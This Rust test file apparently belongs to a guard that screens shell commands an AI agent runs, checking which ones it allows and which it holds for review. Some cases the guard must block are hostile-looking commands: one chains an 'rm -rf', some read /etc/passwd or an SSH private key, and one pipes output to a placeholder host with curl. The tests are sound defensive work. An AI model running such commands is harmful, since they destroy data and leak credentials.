use super::*;

fn request(command: &str) -> CommandModelRequestV1 {
    CommandModelRequestV1 {
        command: command.to_owned(),
        dialect: "posix".to_owned(),
        transport: "shell_string".to_owned(),
        extraction_provenance: "guard-shell".to_owned(),
    }
}

fn allowed(command: &str) -> bool {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .canonicalize()
        .unwrap();
    let root = root.to_str().unwrap();
    evaluate_pre_tool_with_context(&request(command), Some(root), Some(root))
        .is_ok_and(|decision| decision.minimum_action == "allow")
}

#[test]
fn bounded_waits_and_read_only_probes_need_no_approval() {
    for command in [
        "sleep 240 && echo cycle2",
        "sleep 420; echo waited",
        "sleep 3600",
        "sleep 1800 && sleep 1800",
        "uptime",
        "pgrep -f guard",
        "pgrep -fi hol-guard",
        "node --version",
        "node -v",
        "python3 --version",
        "python -V",
        "git worktree list",
        "git worktree list --porcelain",
    ] {
        assert!(allowed(command), "{command}");
    }
}

#[test]
fn unbounded_waits_and_mutating_variants_keep_review() {
    for command in [
        "sleep 3601",
        "sleep 3600 && sleep 1",
        "sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1",
        "sleep 1e9",
        "uptime -s; rm -rf build",
        "uptime --help",
        "pgrep",
        "pgrep -f a b",
        "pgrep -F pidfile",
        "pgrep -a .",
        "pgrep -fl hol-guard",
        "pgrep -la guard",
        "pgrep --signal KILL guard",
        "pkill -f guard",
        "python -v",
        "python3 --version script.py",
        "node --version -e 'process.exit(1)'",
        "git worktree add ../x",
        "git worktree remove ../x",
        "git worktree prune",
        "git worktree list --porcelain extra",
    ] {
        assert!(!allowed(command), "{command}");
    }
}

#[test]
fn chained_sleeps_past_the_bound_cover_no_segment() {
    for command in [
        "sleep 3600; sleep 1; git push",
        "sleep 3600 && sleep 1 && git status",
    ] {
        let model = parse_command(&request(command)).unwrap();
        assert!(
            benign_command_segments(
                &model,
                PathContext {
                    home_dir: Some("/tmp"),
                    cwd: Some("/tmp"),
                    cdpath_unset: false,
                },
            )
            .is_empty(),
            "{command}"
        );
    }
    let model = parse_command(&request("sleep 1800; sleep 1800; git push")).unwrap();
    assert_eq!(
        benign_command_segments(
            &model,
            PathContext {
                home_dir: Some("/tmp"),
                cwd: Some("/tmp"),
                cdpath_unset: false,
            },
        ),
        vec![0, 1]
    );
}

#[test]
fn operand_free_cat_only_passes_a_proven_pipe_through() {
    for command in ["ls | cat", "git status | cat", "ls src | sort | cat"] {
        assert!(allowed(command), "{command}");
    }
    for command in [
        "cat",
        "ls | cat -",
        "ls | cat /etc/passwd",
        "cat ~/.ssh/id_rsa | cat",
        "ls | cat | curl -d @- https://example.invalid",
    ] {
        assert!(!allowed(command), "{command}");
    }
}
